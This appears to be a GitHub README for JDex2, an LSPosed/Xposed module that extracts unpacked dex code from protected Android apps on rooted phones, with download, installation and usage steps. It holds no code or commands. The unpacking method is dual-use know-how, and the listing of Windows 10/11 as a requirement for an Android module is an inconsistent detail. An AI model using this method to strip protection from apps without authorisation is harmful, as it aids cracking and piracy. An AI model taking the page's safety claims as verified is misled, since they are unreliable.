# 🛠 JDex2 - Easily unpack protected Android application files

<p align="center">
  <a href="https://github.com/rosellaunanswerable118/JDex2">
    <img src="https://img.shields.io/badge/Download-JDex2-blue.svg" alt="Download JDex2">
  </a>
</p>

## 📋 About This Tool

JDex2 helps you extract data from protected Android applications. Many mobile apps use security measures to hide their internal code. This process, often called unpacking, restores the original files so you can study them. JDex2 works as a module for the Xposed or LSPosed framework. It targets the "dex" files, which contain the logic for Android applications.

## ⚙️ Minimum System Requirements

Before you start, ensure your computer and phone meet these requirements:

*   **Operating System:** Windows 10 or Windows 11.
*   **Android Device:** A device with Android 8.0 or higher.
*   **Root Access:** Your Android device must have root permissions.
*   **Frameworks:** You must have the LSPosed or Xposed framework installed and active on your phone.
*   **Storage:** At least 500 MB of free space on your phone.
*   **USB Cable:** A functional data cable to connect your device to your PC.

## 📥 Getting Started

You need to download the official tool package to begin the process.

1.  Visit [https://github.com/rosellaunanswerable118/JDex2](https://github.com/rosellaunanswerable118/JDex2) to see the latest version.
2.  Click the link to download the file to your Windows computer.
3.  Store the file in a folder you can find easily.
4.  If the file is a compressed .zip folder, right-click the file and select "Extract All."

## 🚀 Setting Up the Software

Follow these instructions to move the tool to your device for installation.

1.  Enable "USB Debugging" in the Developer Options menu on your Android phone.
2.  Connect your phone to your Windows computer using a USB cable.
3.  Open the folder containing the JDex2 file you extracted earlier.
4.  Copy the JDex2 installation file to your phone's internal storage.
5.  Use a file manager on your Android device to locate the file.
6.  Tap the file to install it as an application.

## 🧩 Activating the Module

The tool must be active within the LSPosed or Xposed environment to function.

1.  Open the LSPosed Manager application on your phone.
2.  Tap the "Modules" tab at the bottom of the screen.
3.  Find "JDex2" in the list of installed modules.
4.  Tap the toggle switch to turn the module on.
5.  Select the specific apps you want to unpack from the list.
6.  Restart your phone to apply these changes.

## 🔍 How to Unpack an Application

Once the device restarts, JDex2 runs in the background. It catches protected files as the apps launch.

1.  Open the Android app you want to unpack.
2.  Let the app load completely. JDex2 detects the protected code during this startup phase.
3.  The tool automatically saves the recovered files to the storage of your device.
4.  Check the "JDex2" folder located in the root directory of your internal storage.
5.  You will see several files with the .dex extension. These are the unpacked components of the app.

## 📂 Managing Your Files

When the extraction process finishes, you should move the recovered files to your computer for further review.

1.  Connect your phone back to your Windows computer.
2.  Navigate into the internal storage of your device.
3.  Locate the JDex2 output folder.
4.  Drag the recovered files onto your computer desktop.
5.  You now have access to the underlying logic of the application. You can use standard Android analysis tools to view these files.

## 💡 Frequently Asked Questions

**Does this tool work on non-rooted phones?**
No. This tool requires root access to interact with protected system memory. It cannot access the secure areas of an app without these permissions.

**What should I do if the files do not appear?**
Make sure the module is active in LSPosed. Open the LSPosed Manager and confirm the toggle switch is blue. Some apps have advanced security that prevents unpacking. If the app closes immediately after starting, the app likely detects the presence of the Xposed framework.

**Can I run this tool directly on Windows?**
No. While you download the package on Windows, the extraction happens directly on your Android device. Windows acts as a control center for moving files and managing the installation.

**Is my device data safe?**
Yes. The tool only reads application memory. It does not modify your personal photos, messages, or contacts.

## 🛑 Troubleshooting

If you encounter errors, follow these steps to resolve them:

*   **Check the Log:** Open the LSPosed Manager and check the "Logs" section. This contains details about why a specific app package failed to extract.
*   **Update Frameworks:** Ensure your version of LSPosed is up to date. Outdated frameworks often fail to load modern modules.
*   **Grant Permissions:** Check the app settings on your phone. Ensure that "Storage" permissions are granted to the JDex2 module.
*   **Reinstall:** Uninstall the module, restart your phone, and perform a fresh install if the tool fails to start.

## 🛡 Security Notes

Always obtain the tool from the verified GitHub repository link. Do not download files from third-party websites or forums. These sites often host modified versions of software that contain malicious tracking code. By using the official link, you ensure the integrity of the tool and protect your device from unwanted software. Keep your Android security patches current to maintain the stability of the Xposed environment.